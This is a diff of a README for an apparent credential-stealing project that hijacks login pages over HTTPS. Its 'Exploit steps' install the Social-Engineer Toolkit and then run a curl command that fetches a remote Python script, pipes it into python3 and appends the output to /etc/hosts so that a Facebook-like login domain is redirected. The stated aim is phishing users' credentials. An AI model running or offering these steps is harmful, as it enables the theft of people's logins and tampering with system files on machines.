@@ -1,16 +1,16 @@
 # WARNING: This is a development project and is not READY for USING ;)
 - BR
 ------------------------------------------------------------------------------------------
-# SSTC-login-HTTPS stealing credentials
+# SSTC-HTTPS-hijack-login-credentials Usage
 - by nu11secur1ty
 
 ![](https://github.com/nu11secur1ty/SSTC-HTTPS-login-credentials/blob/master/logo/http.png)
 
 # Exploit steps:
 1. - Installing requirements
-`pip install -r requirements.txt`
 
-2. - Prepitr packages
+
+2. - Preparing packages
 For other Linux distro attackers
 ```
 $ git clone https://github.com/trustedsec/social-engineer-toolkit/ set/
@@ -22,7 +22,7 @@ $ pip install -r requirements.txt
 setoolkit
 ```
 
-3. - Creating hosts exploit facebook.bgr
+3. - Creating hosts exploit facebook.login.com
 - For Linux
 ```bash
 curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-login-credentials/master/hosts/modules/pyexploitcreate/pyexploitcreateIP_host_fake.py | python3 >> /etc/hosts
